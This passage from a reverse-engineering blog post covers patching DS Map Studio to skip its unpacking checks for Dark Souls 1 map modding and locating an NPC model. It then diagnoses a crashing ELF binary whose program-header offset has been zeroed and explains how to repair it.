style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"remove-all-checks-for-ds1\">Remove All Checks for DS1\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"csharp\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">private\u003C/span>\u003Cspan style=\"color:#F97583\"> bool\u003C/span>\u003Cspan style=\"color:#B392F0\"> GameNotUnpackedWarning\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#B392F0\">GameType\u003C/span>\u003Cspan style=\"color:#B392F0\"> gameType\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // Patch: Bypass unpacking checks for custom DS1 map development\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (gameType \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.DarkSoulsPTDE)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        return\u003C/span>\u003Cspan style=\"color:#79B8FF\"> true\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // Original code for other games\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    bool\u003C/span>\u003Cspan style=\"color:#B392F0\"> flag\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> gameType \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.DarkSoulsIISOTFS;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (flag)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        TaskLogs.\u003C/span>\u003Cspan style=\"color:#B392F0\">AddLog\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">            $\"The files for \u003C/span>\u003Cspan style=\"color:#9ECBFF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">gameType\u003C/span>\u003Cspan style=\"color:#9ECBFF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> do not appear to be unpacked. Please use UXM for DS2 to unpack game files\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            LogLevel.Error,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            TaskLogs.LogPriority.High,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">            null\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        return\u003C/span>\u003Cspan style=\"color:#79B8FF\"> false\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    TaskLogs.\u003C/span>\u003Cspan style=\"color:#B392F0\">AddLog\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">        $\"The files for \u003C/span>\u003Cspan style=\"color:#9ECBFF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">gameType\u003C/span>\u003Cspan style=\"color:#9ECBFF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> do not appear to be fully unpacked. Functionality will be limited. Please use UXM selective unpacker to unpack game files\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        LogLevel.Warning,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        TaskLogs.LogPriority.Normal,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        null\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#79B8FF\"> true\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This will let our custom DS1 map work without the unpacking requirement .\u003C/p>\n\u003Cp>Another function we need to look out for is\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"csharp\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Token: 0x060003F8 RID: 1016 RVA: 0x00033C94 File Offset: 0x00031E94\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tprivate\u003C/span>\u003Cspan style=\"color:#F97583\"> void\u003C/span>\u003Cspan style=\"color:#B392F0\"> LoadVParamsDS1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">\t\t\tthis\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">LoadParamsDS1FromFile\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">this\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.AssetLocator.GameRootDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">param\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">GameParam\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">GameParam.parambnd\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (Directory.\u003C/span>\u003Cspan style=\"color:#B392F0\">Exists\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">this\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.AssetLocator.GameRootDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">param\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">DrawParam\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t\tforeach\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">string\u003C/span>\u003Cspan style=\"color:#B392F0\"> p\u003C/span>\u003Cspan style=\"color:#F97583\"> in\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> Directory.\u003C/span>\u003Cspan style=\"color:#B392F0\">GetFiles\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">this\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.AssetLocator.GameRootDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">param\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">DrawParam\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"*.parambnd\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">\t\t\t\t\tthis\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">LoadParamsDS1FromFile\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(p);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"csharp\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">private\u003C/span>\u003Cspan style=\"color:#F97583\"> void\u003C/span>\u003Cspan style=\"color:#B392F0\"> LoadVParamsDS1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // Params not needed for custom map development\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The simplest approach is just returning immediately - this completely bypasses all param loading without any checks or error handling. This is typically what you want for custom map development where params aren’t required.\r\nMap studio operates on top of something I call mod projects. These are typically stored in a separate directory from the base game, and all modifies files will be saved there instead of overwriting the base game files. The intended workflow is to install mod engine for your respective game and set the modoverridedirectory in modengine.ini to your mod project directory. This way you don’t have to modify base game files (and work on multiple mod projects at a time) and you can easily distribute a mod by zipping up the project directory and uploading it.\u003C/p>\n\u003Cp>Moving Forward: Editing the Maps\r\nWith the technical barriers removed, we are  now ready to start actual map editing work. The map system is my gateway to working with Dark Souls 1’s level files - it handles locating and loading the MapStudio Binary files that contain all the map data.\u003C/p>\n\u003Cp>On why we use DS mapstudio for solving this instead of something like unity to see assets ?\u003C/p>\n\u003Cp>the bindings of Unity data structures to Souls ones grew very messy and buggy, and led to a very unintuitive user experience (i.e. most users can’t intuitively know what Unity operations are actually supported by DSTools for export). Unity also doesn’t provide sufficiently low level APIs for many of its useful subsystems like its lightmapper and navmesh generator, so making these subsystems work for Dark Souls range from painful to impossible\u003C/p>\n\u003Cp>Also reading the file formatter for HAVOC we get , we get a diagram of the loader pipeline\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-4.png\" alt=\"Havok loader pipeline diagram\">\u003C/p>\n\u003Ch3 id=\"supported-xml-classes\">Supported XML classes\u003C/h3>\n\u003Cp>hkRootLevelContainer\r\nhkaAnimationContainer\r\nhkaSkeleton\r\nhkaAnnotationTrack\r\nhkaInterleavedAnimation\r\nhkaAnimationBinding\r\nhkxEnvironment\u003C/p>\n\u003Ch3 id=\"python-wrapper-classes\">Python wrapper classes\u003C/h3>\n\u003Cp>hkRootLevelContainer\r\nhkaAnimationContainer\r\nhkaSkeleton\r\nhkxEnvironment\u003C/p>\n\u003Ch3 id=\"binary-export-classes-v5---v2014\">Binary export classes (v5 - v2014)\u003C/h3>\n\u003Cp>hkRootLevelContainer (read-only)\r\nhkaAnimationContainer (read-only)\r\nhkaSkeleton (read-only)\r\nhkxEnvironment (read-only)\r\nhkNamedVariant\r\nhkaPartition\u003C/p>\n\u003Cp>This is to understand what the GAME dump means to annotate and see what sections and options to be checked for , also we’d need a pugin to display the model GIZMOS , A map and model viewer for NinjaBlade/DeS/DS1/DS2/DS3/Bloodborne preferability  for fucntions like FLVER Model Parsing , MSB Map Layout Parsing , TPF / TPFBHD Texture Pack Parsing , PS4 Texture Headerization , DX11 Texture Support Patch to MonoGame, Binder &#x26; DCX Container Parsing , HKX Collision Parsing(collision meshes, ragdoll setups, and physics constraints) ,\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-5.png\" alt=\"DS Map Studio view 1\">\u003C/p>\n\u003Cp>Since we dont know what model id refers to the Firekeeper model , we can see the Drawparams which takes arguments and passes it into the model’s\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-6.png\" alt=\"DS Map Studio DrawParams\">\u003C/p>\n\u003Cp>The text is in japaneese so are the original functions in . so we have to refer a Language dump online for Darksouls 1 and get the charIDred as reference , The reason why we are doing this is , NPc’s have interaction navmeshes (to put it simply)\r\nSimple in theory, but it does seem painful to get right. I use A* to identify the nodes (individual polygons), then used the funnel algorithm to actually map out the detailed path \u003Ca href=\"https://github.com/recastnavigation/recastnavigation\">NAVMESH\u003C/a>\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-7.png\" alt=\"Language dump reference\">\u003C/p>\n\u003Cp>After cross referencing we get to the mappeice which has the asset , we we are doing this is because NPC’s have set game flags to move from one location to anbother and they behave as different entities depending on the flag bits set to them . In order to avoid the hassble FROMSOFTWARE uses multiple ID’s but refer them under the game AI for the template charectarestics .\u003C/p>\n\u003Cp>Now lets start looking at the model editor to see for NPC’s  : )\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-8.png\" alt=\"Model editor view\">\u003C/p>\n\u003Cp>I’ll remove the lightfilter becuase it’s annoying to see through\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-9.png\" alt=\"Light filter removed\">\u003C/p>\n\u003Cp>And then we find the dialouge in the current setted mappeice to the position DEX\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-10.png\" alt=\"Dialogue position DEX\">\u003C/p>\n\u003Cp>After scrolling and peedking the area we find the model : )\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-11.png\" alt=\"Firekeeper model found\">\u003C/p>\n\u003Ch3 id=\"the-values-for-the-model-id-and-the-location-are-the-flag-bits\">THE VALUES FOR THE MODEL ID AND THE LOCATION ARE THE FLAG BITS\u003C/h3>\n\u003Ch1 id=\"part-2\">PART-2\u003C/h1>\n\u003Ch2 id=\"identifying--binary-characteristics\">Identifying  Binary Characteristics\u003C/h2>\n\u003Cp>\u003Cstrong>Running the binary:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">./rust_vm_poc_mangled\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>Result:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>zsh: segmentation fault  ./rust_vm_poc_mangled\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The binary crashes immediately with a segmentation fault before any visible execution.\u003C/p>\n\u003Chr>\n\u003Ch3 id=\"file-analysis\">File Analysis\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">file\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> rust_vm_poc_mangled\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>Output:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>rust_vm_poc_mangled: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>statically linked, for GNU/Linux 3.10.0, stripped\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>Key observations:\u003C/strong>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>64-bit ELF executable\u003C/strong> - Standard Linux binary format\u003C/li>\n\u003Cli>\u003Cstrong>PIE (Position Independent Executable)\u003C/strong> - Uses ASLR (Address Space Layout Randomization)\u003C/li>\n\u003Cli>\u003Cstrong>Statically linked\u003C/strong> - All dependencies are compiled into the binary (no external shared libraries needed)\u003C/li>\n\u003Cli>\u003Cstrong>Stripped\u003C/strong> - Debug symbols removed, making analysis harder\u003C/li>\n\u003Cli>Built for \u003Cstrong>GNU/Linux 3.10.0\u003C/strong> or higher\u003C/li>\n\u003C/ul>\n\u003Chr>\n\u003Ch3 id=\"strings-analysis\">Strings Analysis\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">strings\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> rust_vm_poc_mangled\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>Critical Finding - Python C API Symbols:\u003C/strong>\u003C/p>\n\u003Cp>The binary contains numerous Python C API function references:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>PyErr_PrintEx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PyBytes_AsString\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PyObject_GetAttr\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PyImport_ExecCodeModuleEx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PyUnicode_AsUTF8AndSize\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PyModule_Type\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PyTuple_New\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PyType_GetFlags\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PyGILState_Ensure\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PyErr_SetRaisedException\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Py_InitializeEx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Py_CompileString\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PyEval_SaveThread\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PyGILState_Release\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Py_IsInitialized\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>Other notable strings:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>nix/store/776irwlgfb65a782cxmyk61pck460fs9-glibc-2.40-66/lib/ld-linux-x86-64.so.2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>__gmon_start__\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>_ITM_deregisterTMCloneTable\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>_ITM_registerTMCloneTable\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>_Unwind_GetLanguageSpecificData\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Chr>\n\u003Cp>Now the obvious out of the way  , when a binary crashes immediately upon execution, before reaching main(), it often means the problem occurs during the operating system’s loading stage. The OS loader begins by reading the ELF header and then the program headers, which describe how to map the binary’s segments into memory-defining their file offsets, virtual addresses, sizes, and permissions. If these program headers are corrupted, the loader will attempt to create invalid memory mappings, leading to a page fault and an instant segmentation fault. Since this happens before the program even starts executing, normal debugging tools are useless at this stage : (\u003C/p>\n\u003Cp>When you run an executable, the OS loader is invoked first. It looks at the list of program headers in the ELF file. It’s mainly interested in the ones marked PT_LOAD.\u003C/p>\n\u003Cp>Each PT_LOAD header is a simple instruction with four critical parts:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>File Offset: Where in the executable file the data starts (e.g., byte 0).\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>File Size: How much data to take from the file (e.g., 40 kilobytes).\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Virtual Address: Where this data should be placed in the process's virtual memory (e.g., at address 0x400000).\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Permissions: What the program is allowed to do there (Read, Write, Execute).\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>A typical binary has at least two PT_LOAD segments:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>The Code Segment (.text): Has Read + Execute permissions. The loader maps the part of the file containing machine code here.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>The Data Segment (.data, .bss): Has Read + Write permissions. The loader maps the part of the file containing initialized global variables and reserves space for uninitialized ones.\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The loader reads these instructions and tells the kernel (via the mmap system call) to set up these memory mappings. The kernel creates the necessary structures to manage this new virtual address space. Only then does the loader transfer control to your program’s entry point.\u003C/p>\n\u003Cp>When analyzing the binary \u003Ccode>rust_vm_poc_mangled\u003C/code>, the first step is to inspect its ELF structure using \u003Ccode>readelf -h rust_vm_poc_mangled\u003C/code>. The output reveals the following critical details:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>ELF Header:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Class:                             ELF64\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Data:                              2's complement, little endian\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Version:                           1 (current)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  OS/ABI:                            UNIX - System V\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  ABI Version:                       0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Type:                              DYN (Shared object file)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Machine:                           Advanced Micro Devices X86-64\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Version:                           0x1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Entry point address:               0xf250\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Start of program headers:          0 (bytes into file)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Start of section headers:          523080 (bytes into file)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Flags:                             0x0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Size of this header:               64 (bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Size of program headers:           56 (bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Number of program headers:         14\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Size of section headers:           64 (bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Number of section headers:         32\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  Section header string table index: 31\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The suspicious field here is \u003Cstrong>“Start of program headers: 0 (bytes into file)”\u003C/strong>. In a valid ELF64 binary, the program header table never begins at offset 0 because offset 0 contains the ELF header itself. Typically, the program headers are placed immediately after the ELF header, at offset \u003Cstrong>64 bytes\u003C/strong> (\u003Ccode>0x40\u003C/code>). The program header table (\u003Ccode>e_phoff\u003C/code>) tells the OS loader where to find the list of segments to map into memory-such as the code segment, data segment, and dynamic linker information.\u003C/p>\n\u003Cp>When \u003Ccode>e_phoff\u003C/code> is incorrectly set to \u003Ccode>0\u003C/code>, the loader misinterprets the ELF header as the first program header. Since the ELF header bytes don’t represent valid segment definitions, the loader reads nonsensical values for file offsets, virtual addresses, and permissions. As a result, during the loading process, it attempts to create invalid memory mappings, which immediately triggers a \u003Cstrong>page fault\u003C/strong>. This leads to an \u003Cstrong>instant segmentation fault\u003C/strong> before the program’s \u003Ccode>main()\u003C/code> function or any initialization code runs. Because the crash occurs inside the kernel’s loading routine, traditional debuggers like \u003Ccode>gdb\u003C/code> can’t attach in time to catch the fault, leaving the binary apparently “undebuggable.”\u003C/p>\n\u003Cp>Since the loader depends entirely on the program headers to set up the memory space, repairing this field is necessary before further analysis or execution. The fix involves correcting the \u003Cstrong>Program Header Table offset\u003C/strong> (\u003Ccode>e_phoff\u003C/code>) in the ELF header. For ELF64 files, this value resides at byte offset \u003Ccode>0x20\u003C/code> within the file. Using a hex editor, you can navigate to that position and replace the eight bytes representing \u003Ccode>0x0000000000000000\u003C/code> with \u003Ccode>0x0000000000000040\u003C/code> (the little-endian encoding of decimal 64).\u003C/p>\n\u003Cp>Next step would be to write a solve script for the binary to patch the magic headers\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sys\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> os\u003C/span>\u003C/span>\n\u003Cspan 